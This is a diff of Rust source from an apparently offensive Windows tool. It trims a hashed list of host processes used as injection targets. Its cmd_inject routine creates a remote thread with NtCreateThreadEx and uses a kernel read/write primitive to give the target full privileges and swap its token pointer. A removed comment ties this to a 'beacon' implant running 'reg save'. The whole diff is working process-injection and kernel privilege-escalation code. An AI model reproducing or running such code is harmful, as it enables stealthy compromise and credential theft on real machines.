@@ -102,13 +102,7 @@ const fn fnv1a(s: &[u8]) -> u32 {
 
 const WLIST: &[u32] = &[
     fnv1a(b"svchost.exe"),
-    fnv1a(b"explorer.exe"),
-    fnv1a(b"runtimebroker.exe"),
-    fnv1a(b"dllhost.exe"),
     fnv1a(b"spoolsv.exe"),
-    fnv1a(b"sihost.exe"),
-    fnv1a(b"taskhostw.exe"),
-    fnv1a(b"ctfmon.exe"),
 ];
 
 fn is_whitelisted(name: &str) -> bool {
@@ -375,15 +369,12 @@ pub fn cmd_inject(dev: &Device, target_pid: Option<u64>) -> Result<()> {
     if st != 0 { bail!("NtCreateThreadEx failed: {st:x}"); }
     log_debug(&format!("NtCreateThreadEx success: thread handle {:?}", hthread));
 
-    // We forcefully enable all present privileges so the beacon doesn't get Access Denied on things like reg save
     escalate_eproc(&krw, target_eproc, sys_present, sys_present)?;
     println!("[+] PID {} is God", final_pid);
 
     unsafe { CloseHandle(hthread); }
     unsafe { CloseHandle(hproc); }
 
-    // Restore our original privileges!
-    // Restore our original token pointer!
     krw.kwrite(our_token_ptr_addr, our_orig_token_ptr)?;
 
     log_debug("cmd_inject finished successfully, token restored!");
